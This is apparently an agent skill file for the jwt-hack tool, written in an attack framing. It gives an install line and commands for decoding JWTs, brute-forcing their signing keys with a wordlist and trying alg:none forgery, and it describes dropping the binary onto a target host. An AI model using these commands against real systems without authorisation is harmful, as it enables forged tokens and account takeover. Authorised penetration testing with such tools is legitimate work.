---
name: jwt-hack-token
description: "jwt-hack quickly decodes and brute-forces tokens. Signals: API attack, interface testing, token decoding, key brute force."
zh-signals: "jwt-hack: 快速令牌拆解与爆破。信号:api攻击,接口测试,解码,爆破密钥。"
when-to-use: >-
  Use when you need a lightweight, single-binary JWT tool on a target host to decode tokens,
  brute-force keys, or attempt alg:none attacks.
---

# jwt-hack

- Attack Category: C10 API and Business Logic Attacks
- Upstream Repository: https://github.com/mboekamp/jwt-hack
- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
go install github.com/mboekamp/jwt-hack@latest
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `jwt-hack decode <token>` | Decode |
| `jwt-hack encode -alg HS256 -payload '{"a":1}'` | Generate |
| `jwt-hack brute -t <token> -w words.txt` | Brute-force the key |
| `jwt-hack none -t <token>` | alg:none attack |

## Attack Scenario Playbook

### Fast token decoding and brute force

```bash
jwt-hack brute -t $TOKEN -w jwt.secrets.list
jwt-hack none -t $TOKEN
```

## Notes

A lightweight Go alternative to jwt_tool; the single binary makes it easy to drop onto a target host.
